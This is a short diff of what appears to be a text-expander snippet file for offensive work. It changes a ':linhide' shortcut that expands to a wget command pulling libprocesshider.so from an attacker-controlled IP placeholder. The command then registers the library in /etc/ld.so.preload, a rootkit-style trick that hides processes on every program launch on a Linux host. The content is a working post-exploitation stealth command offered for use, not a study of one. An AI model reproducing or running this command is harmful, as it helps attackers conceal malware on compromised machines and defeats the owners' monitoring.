@@ -69,5 +69,5 @@ matches:
     
   - trigger: ":linhide"
     replace: |
-      wget http://{{IP}}/libprocesshider.so -O /etc/ld.so.preload && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+      wget http://{{IP}}/libprocesshider.so -O /usr/local/lib/libprocesshider.so && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
     
